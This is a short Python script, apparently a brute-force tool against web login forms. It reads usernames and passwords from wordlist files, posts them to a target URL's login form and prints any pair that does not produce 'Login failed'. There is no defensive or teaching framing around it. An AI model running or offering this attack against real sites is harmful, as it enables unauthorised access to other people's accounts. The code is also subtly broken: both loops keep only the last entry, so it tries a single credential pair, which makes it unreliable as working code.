from bs4 import BeautifulSoup
import requests
from urllib.parse import urljoin

URL = input("\nEnter Target URL : ")
s = requests.Session()

def fetch(url, data=None):
    if data is None:
        return s.get(url).content
    else:
        return s.post(url, data=data).content

soup = BeautifulSoup(fetch(URL),'lxml')
form = soup.find('form')
fields = form.findAll('input')

with open('user.txt', 'r') as user_list:
    for usr in user_list.readlines():
        user = usr.strip()

with open('pass.txt', 'r') as wordlist:
    for word in wordlist.readlines():
        passw = word.strip()

formdata = dict( (field.get('name'), field.get('value')) for field in fields)
formdata['username'] = user
formdata['password'] = passw
posturl = urljoin(URL, form['action'])
r = s.post(posturl, data=formdata)

if "Login failed" not in r.text:
    print("\n [ Login Success ] \n","\nUsername : ",user,"\n\nPassword : ",passw ,"\n")
else:
    print("\nPassword not found")